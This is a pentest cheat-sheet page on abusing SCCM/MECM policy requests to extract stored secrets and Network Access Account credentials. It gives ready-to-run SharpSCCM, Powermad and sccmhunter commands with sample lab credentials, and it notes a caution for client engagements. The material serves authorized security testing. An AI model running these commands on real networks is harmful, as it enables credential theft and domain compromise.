# Policy Request Credentials

https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/sccm-mecm/cred-2-policy-request-credentials

## Description

Request computer policy and deobfuscate secrets

## Requirements

1) PKI certificates are not required for client authentication

Additionally, any of the below requirements can be met to perform this attack.

2) Domain Computer credentials 

3) The ability to create computer objects (MachineAccountQuota)

4) Local administrator on a SCCM client

## Windows

### Local Administrator on SCCM client

If you are a local administrator or running as SYSTEM on a SCCM client. We can simply request the computer policy without specifying any credentials

    SharpSCCM.exe get secrets

### Using Domain Computer credentials

If we have a password for a domain computer account we can use this directly with SharpSCCM to register a new device

    SharpSCCM.exe get secrets -r EvilDevice -u mecm$ -p 'I(A*r@KqUuoj5oHFO=<--Snip>-->'

### Machine Account Quota

Create new machine account with Powermad

    New-MachineAccount -MachineAccount  EvilSCCM$ -Domain sccm.lab -DomainController 192.168.60.10

Use SharpSCCM to request policy for the new account

##### get secrets is preferred over naa due to secrets potentially containing further credentials from task sequences and collection varaibles

    SharpSCCM.exe get secrets -r newdevice -u EvilSCCM$ -p Evil123
    SharpSCCM.exe get naa -r newdevice -u EvilSCCM$ -p Evil123

## Linux

### SCCMhunter

##### auto, requires user credentials and MachineAccountQuota greater than 0

    python3 sccmhunter.py http -u standard-user -p 'Password1!' -d sccm.lab -dc-ip 192.168.60.10 -auto -sleep 30

##### Manual, requires user credentials and computer account credentials

    python3 sccmhunter.py http -u standard-user -p 'Password1!' -d sccm.lab -dc-ip 192.168.60.10 -cn 'EvilRiley$' -cp Evil123 -sleep 30

### CAUTION: This will create a device object within SCCM. Ensure that when on an engagement, the client is informed and request for it to be deleted once completed.

